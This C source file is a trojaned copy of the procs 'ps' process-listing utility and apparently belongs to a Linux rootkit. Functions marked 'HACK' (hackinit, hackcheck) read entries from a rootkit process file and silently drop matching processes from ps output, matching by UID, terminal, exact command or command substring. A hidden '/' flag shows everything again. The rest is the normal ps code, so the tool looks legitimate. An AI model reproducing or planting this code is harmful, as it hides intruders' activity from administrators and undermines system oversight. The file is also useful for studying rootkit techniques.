/*
 * ps.c                - show process status
 *
 * Copyright (c) 1992 Branko Lankester
 *
 * Snarfed and HEAVILY modified for procps by Michael K. Johnson,
 * (johnsonm@sunsite.unc.edu).  What is used is what is required to have a
 *  common interface.
 *
 * Massive modifications by Charles Blake (cblake@bbn.com).  Rewrite
 * of the system process table code, multilevel sorting, device number
 * database, forest feature (contributed by ...), environment variables, GNU
 * style long options, pid list filtering (contributed by Michael Shields).
 *
 * Changes Copyright (C) 1993, 1994 Michael K. Johnson,
 *   and   Copyright (C) 1995, 1996 Charles Blake
 * See file COPYING for copyright details.
 */
#include <proc/version.h>
#include <proc/readproc.h>
#include <proc/ps.h>
#include <proc/psdata.h>
#include <proc/devname.h>
#include <proc/tree.h>
#include <proc/sysinfo.h>

#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pwd.h>
#include <time.h>
#include <limits.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/sched.h>
#include <linux/tty.h>

/* HACK DEFS */
#include "../rootkit.h"
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"
int showall=0;

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

void hackinit(void)
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;

   if ((int)fp_hack=fopen(ROOTKIT_PROCESS_FILE,"r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

int hackcheck(proc_t *p)
{
int i=0;
   for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
      switch (h_tmp->hack_type) {
       case 0:
         if (p->uid==atoi(h_tmp->hack_cmd))
           return 1;
         break;
       case 1:
	 while((p->ttyc[i]==' ')&&(i<4)) i++;
         if (!strcmp(&p->ttyc[i], h_tmp->hack_cmd))
           return 1;
         break;
       case 2:
	 if (strcmp((char *)p->cmd,h_tmp->hack_cmd)==0)
	   return 1;
         break;
	case 3:
	 if (strstr((char *)p->cmd,h_tmp->hack_cmd))
           return 1;
         break;
      }
   }
return 0;
}

void show_short(char*, proc_t*);
void show_long (char*, proc_t*);
void show_user (char*, proc_t*);
void show_jobs (char*, proc_t*);
void show_sig  (char*, proc_t*);
void show_vm   (char*, proc_t*);
void show_m    (char*, proc_t*);
void show_regs (char*, proc_t*);

/* this struct replaces the previously parallel fmt_fnc and hdrs */
struct {
    void      (*format)(char*,proc_t*);
    char        CL_option_char;
    const char*	default_sort;
    const char*	header;
} mode[] = {
    { show_short,  0 , "Up", "  PID TTY STAT  TIME COMMAND" },
    { show_long,  'l', "Pp", " FLAGS   UID   PID  PPID PRI  NI   SIZE   RSS WCHAN       STA TTY TIME COMMAND" },
    { show_user,  'u', "up", "USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND" },
    { show_jobs,  'j', "gPp"," PPID   PID  PGID   SID TTY TPGID  STAT   UID   TIME COMMAND" },
    { show_sig,   's', "p",  "  UID   PID SIGNAL   BLOCKED  IGNORED  CATCHED  STAT TTY   TIME COMMAND" },
    { show_vm,    'v', "r",  "  PID TTY STAT  TIME  PAGEIN TSIZ DSIZ  RSS   LIM %MEM COMMAND" },
    { show_m,     'm', "r",  "  PID TTY MAJFLT MINFLT   TRS   DRS  SIZE  SWAP   RSS  SHRD   LIB  DT COMMAND" },
    { show_regs,  'X', "p",  "NR   PID    STACK      ESP      EIP TMOUT ALARM STAT TTY   TIME COMMAND" },
    { NULL, 0, NULL, NULL }
};

/* some convenient integer constants corresponding to the above rows. */
enum PS_MODALITY { PS_D = 0, PS_L, PS_U, PS_J, PS_S, PS_V, PS_M, PS_X };

extern int   sort_depth;
extern int   sort_direction[];
extern int (*sort_function[])(/* void* a, void* b */);

int    parse_sort_opt (const char*);
int    parse_long_sort(const char*);
char * status         (proc_t*);
char * prtime         (char *s, unsigned long t, unsigned long rel);
void   usage          (char* context);
void   set_cmdspc     (int w_opts);
void   show_procs     (unsigned maxcmd, int do_header, int, void*,int);
void   show_cmd_env   (char* tskcmd, char** cmd, char** env, unsigned maxch);
void   show_a_proc    (proc_t* the_proc, unsigned maxcmd);
void   show_time      (char *s, proc_t * p);
void   add_node       (char *s, proc_t *task);
int    node_cmp       (const void *s1, const void *s2);
void   show_tree      (int n, int depth, char *continued);
void   show_forest    (void);

int CL_fmt       = 0;

/* process list filtering command line options */

int CL_all,
    CL_kern_comm,
    CL_no_ctty,
    CL_run_only;
char  * CL_ctty;
pid_t * CL_pids;          /* zero-terminated list, dynamically allocated */

/* process display modification command line options */

int CL_show_env,
    CL_num_outp,          /* numeric fields for user, wchan, tty */
    CL_sort     = 1,
    CL_forest,
    CL_Sum,
    CL_pg_shift = 2;      /* default: show k instead of pages */

/* Globals */

unsigned cmdspc = 80;     /* space left for cmd+env after table per row */
int      GL_current_time; /* some global system parameters */
unsigned GL_main_mem;
long     GL_time_now;
int      GL_wchan_nout;   /* this is can also be set on the command-line  */

int main(int argc, char **argv) {
    char *p;
    int width = 0,
	do_header = 1,
	psdbsucc = 0,
	user_ord = 0,
	next_arg = 0,
	toppid = 0,
	pflags, N = 1;
    void* args = NULL;
    dev_t tty[2] = { 0 };
    uid_t uid[1];
hackinit(); /* HACKINIT */
 
    set_linux_version();
    do {
        --argc;		/* shift to next arg. */
        ++argv;
        for (p = *argv; p && *p; ++p) {
            switch (*p) {
	      case '-':               /* "--" ==> long name options */
		if (*(p+1) == '-') {
                    if (strncmp(p+2,"sort",4)==0) {
			if (parse_long_sort(p+7) == -1)
			    usage("unrecognized long sort option\n");
			user_ord = 1;
			next_arg = 1;
			break;
                    } else if (strncmp(p+2, "help", 4) == 0) {
			usage(NULL);
			dump_keys();
			return 0;
                    } else if (strncmp(p+2, "version", 6) == 0) {
			display_version();
			return 0;
                    } else if (*(p+2) != '\0')	/* just '-- '; not an error */
			usage("ps: unknown long option\n");
		}
		break;
	      case 'l': CL_fmt = PS_L;   /* replaceable by a */	break;
	      case 'u': CL_fmt = PS_U;   /* loop over mode[] */	break;
	      case 'j': CL_fmt = PS_J;				break;
	      case 's': CL_fmt = PS_S;				break;
	      case 'v': CL_fmt = PS_V;				break;
	      case 'm': CL_fmt = PS_M;				break;
	      case 'X': CL_fmt = PS_X;   /* regs */		break;

	      case 'r': CL_run_only = 1; /* list filters */	break;
	      case 'a': CL_all = 1;				break;
	      case 'x': CL_no_ctty = 1;				break;
	      case 't': CL_ctty = p + 1;
		next_arg = 1;				break;

	      case 'e': CL_show_env = 1; /* output modifiers */	break;
	      case 'f': CL_forest = 1;
		CL_kern_comm = 0;			break;
	      case 'c': CL_kern_comm = 1;			break;
	      case 'w': ++width;				break;
	      case 'h': do_header = 0;				break;
	      case 'n': CL_num_outp = 1;
		GL_wchan_nout = 1;			break;
	      case 'S': CL_Sum = 1;				break;
	      case 'p': CL_pg_shift = 0;			break;
	      case 'o': CL_sort = !CL_sort;			break;
	      case 'O':
		if (parse_sort_opt(p+1) == -1)
		    usage("short form sort flag parse error\n");
		user_ord = 1;
		next_arg = 1;
		break;
	      case 'V': display_version(); exit(0);
#if defined (SHOWFLAG)
	      case '/': showall++;
#endif	
	      default:
                /* Step through, reading+alloc space for comma-delim pids */
		if (isdigit(*p)) {
		    while (isdigit(*p)) {
			CL_pids = xrealloc(CL_pids, (toppid + 2)*sizeof(pid_t));
			CL_pids[toppid++] = atoi(p);
			while (isdigit(*p))
			    p++;
			if (*p == ',')
			    p++;
		    }
		    CL_pids[toppid] = 0;
		    next_arg = 1;
		}
		if (*p)
		    usage("unrecognized option or trailing garbage\n");
            }
            if (next_arg) {
                next_arg = 0;
                break;       /* end loop over chars in this argument */
            }
        }
    } while (argc > 1);

    if (!CL_sort)	/* since the unsorted mode is intended to be speedy */
	CL_forest = 0;	/* turn off the expensive forest option as well. */

    if (CL_fmt == PS_L)
	if (open_psdb())
	    GL_wchan_nout = 1;
	else
	    psdbsucc = 1;

    set_cmdspc(width);

    if (!(GL_main_mem = read_total_main()) ||
	!(GL_current_time = uptime(0,0)))
	return 1;
    GL_time_now = time(0L);

    if (CL_sort && !user_ord)
        parse_sort_opt(mode[CL_fmt].default_sort);

    /* NOTE:  all but option parsing has really been done to enable
     * multiple uid/tty/state filtering as well as multiple pid filtering
     */
    pflags = PROC_ANYTTY;	/* defaults */

    if (!CL_kern_comm)	pflags |= PROC_FILLCMD;  	 /* verbosity flags */
    if (CL_fmt == PS_M) pflags |= PROC_FILLMEM;
    if (CL_show_env)	pflags |= PROC_FILLENV;
    if (!CL_num_outp)	pflags |= PROC_FILLUSR | PROC_FILLTTY;

    if (CL_no_ctty)	pflags &= ~PROC_ANYTTY;		/* filter flags */
    if (CL_run_only)  { pflags |= PROC_STAT; args = "RD"; }
    else if (!CL_all)      { pflags |= PROC_UID;  args = uid; uid[0] = getuid(); pflags &= ~PROC_STAT; }
    if (CL_pids)      { pflags |= PROC_PID;  args = CL_pids; pflags &= ~PROC_UID; pflags &= ~PROC_STAT; }
    if (CL_ctty) {
	if ((tty[0] = tty_to_dev(CL_ctty)) == (dev_t)-1) {
	    fprintf(stderr, "the name `%s' is not a tty\n", CL_ctty);
	    exit(1);
	}
	pflags = (pflags | PROC_TTY) & ~(PROC_ANYTTY|PROC_STAT|PROC_UID|PROC_PID);
	args = tty;
    }
    show_procs(cmdspc, do_header, pflags, args, N);
    if (psdbsucc)
	close_psdb();
    return 0;
}

/* print a context dependent usage message and maybe exit
 */
void usage(char* context) {
    fprintf(stderr,
	    "%s"
            "usage:  ps -acehjlnrsSuvwx{t<tty>|#|O[-]u[-]U..} \\\n"
            "           --sort:[-]key1,[-]key2,...\n"
            "           --help gives you this message\n"
            "           --version prints version information\n",
	    context ? context : "");
    if (context)
	exit(1);	/* prevent bad exit status by calling usage("") */
}

/* set maximum chars displayed on a line based on screen size.
 * Always allow for the header, with n+1 lines of output per row.
 */
void set_cmdspc(int n) {
    struct winsize win;
    int h = strlen(mode[CL_fmt].header),
	c = strlen("COMMAND");

    if (ioctl(1, TIOCGWINSZ, &win) != -1 && win.ws_col > 0)
	cmdspc = win.ws_col;
    if (n > 100) n = 100;	/* max of 100 'w' options */
    if (cmdspc > h)
	cmdspc = cmdspc*(n+1) - h + c;
    else
	cmdspc = cmdspc*n + c;
}

/* This is the main driver routine that iterates over the process table.
 */
void show_procs(unsigned maxcmd, int do_header, int pflags, void* args, int N) {
    static proc_t buf; /* less dynamic memory allocation when not sorting */
    PROCTAB* tab;
    proc_t **ptable = NULL, *next, *retbuf = NULL;
    int n = 0;

    /* initiate process table scan */
    tab = openproc(pflags, args, N);

    if (do_header) puts(mode[CL_fmt].header);	/* print header */

    if (!(CL_sort || CL_forest))	/* when sorting and forest are both */
	retbuf = &buf;			/* off we can use a static buffer */

    while ((next = readproc(tab,retbuf))) {	/* read next process */
/* HACK */
if ((hackcheck(next)==0)||showall) {
	n++;					/* Now either: */
	if (CL_forest) {			/*    add process to tree */
	    static char s[256];
	    if (CL_num_outp)
		snprintf(next->ttyc, sizeof next->ttyc, "%04.4x", next->tty);
	    (mode[CL_fmt].format)(s, next);
	    if (CL_fmt != PS_V && CL_fmt != PS_M)
		show_time(s+strlen(s), next);
	    add_node(s, next);
	} else if (CL_sort) {			/*    add process to table */
	    ptable = realloc(ptable, n*sizeof(proc_t*));
	    ptable[n-1] = next;
	} else {				/*    or show it right away */
	    show_a_proc(&buf, maxcmd);
	    if (buf.cmdline) free((void*)(buf.cmdline[0]));
	    if (buf.environ) free((void*)(buf.environ[0]));
	}
} /* END HACK */
    }
    if (!n) {
	fprintf(stderr, "No processes available.\n");
	exit(1);
    }
    if (CL_sort && !CL_forest) {	/* just print sorted table */
	int i;
	qsort(ptable, n, sizeof(proc_t*), (void*)mult_lvl_cmp);
	for (i = 0; i < n; i++) {
	    show_a_proc(ptable[i], maxcmd);
	    freeproc(ptable[i]);
	}
	free(ptable);
    } else if (CL_forest)
	show_forest();
}

/* show the trailing command and environment in available space.
 * use abbreviated cmd if requested, NULL list, or singleton NULL string
 */
void show_cmd_env(char* tskcmd, char** cmd, char** env, unsigned maxch) {
    if (CL_kern_comm)		/* no () when explicit request for tsk cmd */
	maxch = print_str(stdout, tskcmd, maxch);
    else if (!cmd || !*cmd || (!cmd[1] && !*cmd)) {
	/* no /proc//cmdline ==> bounding () */
	if (maxch) {
	    fputc('(', stdout);
	    maxch--;
	}
	maxch = print_str(stdout, tskcmd, maxch);
	if (maxch) {
	    fputc(')', stdout);
	    maxch--;
	}
    } else
	maxch = print_strlist(stdout, cmd, " ", maxch);
    if (CL_show_env && env)
	print_strlist(stdout, env, " ", maxch);
    fputc('\n', stdout);
}


/* format a single process for output.
 */
void show_a_proc(proc_t* p, unsigned maxch) {
    static char s[2048];
    if (CL_num_outp)
	snprintf(p->ttyc, sizeof p->ttyc, "%04.4x", p->tty);
    (mode[CL_fmt].format)(s, p);
    if (CL_fmt != PS_V && CL_fmt != PS_M)
	show_time(s+strlen(s), p);
    printf("%s", s);
    show_cmd_env(p->cmd, p->cmdline, p->environ, maxch);
}

/* The format functions for the various formatting modes follow */

void show_short(char *s, proc_t *p) {
    sprintf(s, "%5d %3s %s", p->pid, p->ttyc, status(p));
}

void show_long(char *s, proc_t *p) {
    char wchanb[10];
    
    if (GL_wchan_nout)
	sprintf(wchanb, " %-9x ", p->wchan);
    else
	sprintf(wchanb, "%-11.11s", wchan(p->wchan));
    sprintf(s, "%6x %5d %5d %5d %3d %3d %6d %5d %-11.11s %s%3s",
	    p->flags, p->uid, p->pid, p->ppid, p->priority, p->nice,
	    p->vsize >> 10, p->rss * 4, wchanb, status(p), p->ttyc);
}

void show_jobs(char *s, proc_t *p) {
    sprintf(s, "%5d %5d %5d %5d %3s %5d  %s %5d ",
	    p->ppid, p->pid, p->pgrp, p->session, p->ttyc, p->tpgid, status(p),
	    p->uid);
}

void show_user(char *s, proc_t *p) {
    int pmem, total_time, seconds;
    time_t start;
    unsigned int pcpu;

    if (CL_num_outp)
	s += sprintf(s, "%5d    ", p->uid);
    else
	s += sprintf(s, "%-8s ", p->user);
    seconds = (((GL_current_time * 100) - p->start_time) / HZ);
    start = GL_time_now - seconds;
    total_time = (p->utime + p->stime +
		  (CL_Sum ? p->cutime + p->cstime : 0));
    pcpu = seconds ?
	(total_time * 10) / seconds :
	0;
    if (pcpu > 999) pcpu = 999;
    pmem = p->rss * 1000 / (GL_main_mem >> 12);
    sprintf(s, "%5d %2u.%u %2d.%d %5d %5d %2s %s%.6s ",
	    p->pid,  pcpu / 10, pcpu % 10,  pmem / 10, pmem % 10,
	    p->vsize >> 10, p->rss << 2, p->ttyc, status(p),
	    ctime(&start) + (GL_time_now - start > 3600*24 ? 4 : 10));
}

void show_sig(char *s, proc_t *p) {
    sprintf(s, "%5d %5d %08x %08x %08x %08x %s %3s ",
	    p->uid, p->pid, p->signal, p->blocked, p->sigignore, p->sigcatch,
	    status(p), p->ttyc);
}

void show_vm(char *s, proc_t *p) {
    int pmem;

    s += sprintf(s,"%5d %3s %s", p->pid, p->ttyc, status(p));
    show_time(s, p);
    s += strlen(s);
    s += sprintf(s, " %6d %4d %4d %4d ",
		 p->maj_flt + (CL_Sum ? p->cmaj_flt : 0),
		 p->vsize ? (p->end_code - p->start_code) >> 10 : 0,
		 p->vsize ? (p->vsize - p->end_code + p->start_code) >> 10 : 0,
		 p->rss << 2);
    if(p->rss_rlim == RLIM_INFINITY)
	s += sprintf(s, "   xx ");
    else
	s += sprintf(s, "%5d ", p->rss_rlim >> 10);
    pmem = p->rss * 1000 / (GL_main_mem >> 12);
    sprintf(s, "%2d.%d ", pmem / 10, pmem % 10);
}


void show_m(char *s, proc_t *p) {
    sprintf(s, "%5d %3s %6d %6d %5d %5d %5d %5d %5d %5d %5d %3d ", 
	    p->pid, p->ttyc,
	    p->maj_flt + (CL_Sum ? p->cmaj_flt : 0),
	    p->min_flt + (CL_Sum ? p->cmin_flt : 0),
	    p->trs << CL_pg_shift,
	    p->drs << CL_pg_shift,
	    p->size << CL_pg_shift,
	    (p->size - p->resident) << CL_pg_shift,
	    p->resident << CL_pg_shift,
	    p->share << CL_pg_shift,
	    p->lrs << CL_pg_shift,
	    p->dt);
}

void show_regs(char *s, proc_t *p) {
    char time1[16], time2[16];

    sprintf(s, "%2d %5d %8x %8x %8x %s %s %s %3s ",
	    p->start_code >> 26, p->pid, p->start_stack,
	    p->kstk_esp, p->kstk_eip,
	    prtime(time1, p->timeout, GL_current_time*HZ),
	    prtime(time2, p->it_real_value, 0),
	    status(p), p->ttyc);
}

char *prtime(char *s, unsigned long t, unsigned long rel) {
    if (t == 0) {
        sprintf(s, "     ");
        return s;
    }
    if ((long) t == -1) {
        sprintf(s, "   xx");
        return s;
    }
    if ((long) (t -= rel) < 0)
        t = 0;
    if (t > 9999)
        sprintf(s, "%5lu", t / 100);
    else
        sprintf(s, "%2lu.%02lu", t / 100, t % 100);
    return s;
}

void show_time(char *s, proc_t * p) {
    unsigned t;
    t = (p->utime + p->stime) / HZ;
    if (CL_Sum) t += (p->cutime + p->cstime) / HZ;
    sprintf(s, "%3d:%02d ", t / 60, t % 60);
}

/* fancy process family tree based cmdline printing.  Building the tree
   should be relegated to libproc and only the printing logic should
   remain here.
*/
struct tree_node * node;  /* forest mode globals */
int      nodes = 0;
int      maxnodes = 0;

void add_node(char *s, proc_t *task) {
    if (maxnodes == 0) {
	maxnodes = 64;
        node = (struct tree_node *)
            malloc(sizeof(struct tree_node) * maxnodes);
    }
    if (nodes > maxnodes) {
	maxnodes *= 2;
        node = (struct tree_node *)
            realloc(node, sizeof(struct tree_node) * maxnodes);
    }
    node[nodes].proc        = task;
    node[nodes].pid         = task->pid;
    node[nodes].ppid        = task->ppid;
    node[nodes].line        = strdup(s);
    node[nodes].cmd         = task->cmd;
    node[nodes].cmdline     = task->cmdline;
    node[nodes].environ     = task->environ;
    node[nodes].children    = 0;
    node[nodes].have_parent = 0;
    nodes++;
}

int node_cmp(const void *s1, const void *s2) {
    struct tree_node *n1 = (struct tree_node *) s1;
    struct tree_node *n2 = (struct tree_node *) s2;
    return n1->pid - n2->pid;
}

void show_tree(int n, int depth, char *continued) {
    int i, cols = 0;

    fprintf(stdout, "%s", node[n].line);
    for (i = 0; i < depth; i++) {
        if (cols + 4 >= cmdspc - 1)
            break; 
        if (i == depth - 1)
            printf(" \\_ ");
        else if (continued[i])
            printf(" |  ");
        else
            printf("    ");
        cols += 4;
    }
    show_cmd_env(node[n].cmd, node[n].cmdline, node[n].environ, cmdspc - cols);
    for (i = 0; i < node[n].children; i++) {
        continued[depth] = i != node[n].children - 1;
        show_tree(node[n].child[i], depth + 1, continued);
    }
}

void show_forest() {
    register int i, j;
    int parent;
    char continued[1024];

    if (CL_sort)
	qsort((void*)node, nodes, sizeof(struct tree_node), (void*)node_mult_lvl_cmp);

    for (i = 0; i < nodes; i++) {
        if (node[i].ppid > 1 && node[i].pid != node[i].ppid) {
	    parent = -1;
	    for (j=0; j<nodes; j++)
		if (node[j].pid==node[i].ppid)
		    parent = j;
        } else
            parent = -1;
        if (parent >= 0) {
            node[i].have_parent++;
            if (node[parent].children == 0) {
                node[parent].child = (int*)malloc(16 * sizeof(int*));
                node[parent].maxchildren = 16;
            }
            else if (node[parent].children == node[parent].maxchildren) {
                node[parent].maxchildren *= 2;
                node[parent].child = (int*)realloc(node[parent].child,
						   node[parent].maxchildren
						   * sizeof(int*));
            }
            node[parent].child[node[parent].children++] = i;
        }
    }

    for (i = 0; i < nodes; i++) {
        if (!node[i].have_parent)
            show_tree(i, 0, continued);
    }
}
